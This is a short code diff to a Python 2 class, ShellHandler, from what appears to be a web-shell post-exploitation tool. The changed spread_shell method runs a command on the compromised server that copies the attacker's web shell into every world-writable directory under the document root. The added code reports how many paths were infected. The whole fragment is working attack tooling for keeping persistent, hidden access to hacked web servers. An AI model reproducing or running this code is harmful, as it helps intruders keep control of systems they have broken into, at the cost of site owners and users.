@@ -41,9 +41,18 @@ class ShellHandler(object):
     def spread_shell(self):
         provided_shell_name = raw_input('\n{0}[!] Current shell name{1}: '.format(Colors.RED, Colors.END))
         shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
-        cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp {1}'.format(linux.get_doc_root(), shell_name)
-        print make_request.get_page_source(cmd)[0]
-        print '[+] Attempted to spread "{0}" into any writable paths\n[+] Type "writable" to these locations'.format(shell_name)
+        cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp -v {1}'.format(linux.get_doc_root(), shell_name)
+        done = make_request.get_page_source(cmd)
+        if done:
+            success = '\n[+] {hot}{shell_name}{end} already written to {hot}{writable_length}{end} paths'.format(
+                    shell_name=shell_name,
+                    writable_length=len(done),
+                    hot=Colors.HOT,
+                    end=Colors.END,)
+            success += '\n[+] To check these paths type {0}writable{1}'.format(Colors.HOT, Colors.END)
+            print success
+        else:
+            print '[!] Something went wrong while spreading shell.'
 
 linux = LinuxVersion()
 shell_handler = ShellHandler()
